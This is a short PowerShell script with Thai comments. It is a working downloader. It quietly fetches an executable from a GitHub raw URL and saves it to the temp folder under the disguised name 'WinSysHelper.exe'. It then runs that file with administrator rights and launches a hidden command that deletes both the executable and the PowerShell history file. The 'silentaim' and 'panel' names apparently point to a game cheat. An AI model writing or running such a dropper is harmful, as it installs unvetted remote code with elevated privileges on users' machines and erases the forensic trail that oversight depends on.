$ErrorActionPreference = 'SilentlyContinue'

# 1. ลบไฟล์เก่าออกก่อนถ้ามี (ป้องกันไฟล์ค้างแล้วโหลดใหม่ไม่ได้)
$output = "$env:TEMP\WinSysHelper.exe"
if (Test-Path $output) { Remove-Item $output -Force }

# 2. ดาวน์โหลด (ใช้คำสั่งดั้งเดิมของ Windows)
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

# 3. เช็คขนาดไฟล์ (ถ้าไฟล์มาไม่ครบ ห้ามรัน)
if ((Get-Item $output).Length -gt 100) {
    # รันแบบ Admin ทันที
    Start-Process -FilePath $output -Verb RunAs
    
    # 4. สั่ง CMD ลบประวัติและไฟล์ทิ้ง (รอ 10 วินาทีเพื่อให้ EXE รันติดก่อน)
    $history = (Get-PSReadlineOption).HistorySavePath
    $clean = "timeout /t 10 && del /f /q `"$output`" && del /f /q `"$history`""
    Start-Process cmd -ArgumentList "/c $clean" -WindowStyle Hidden
}

exit
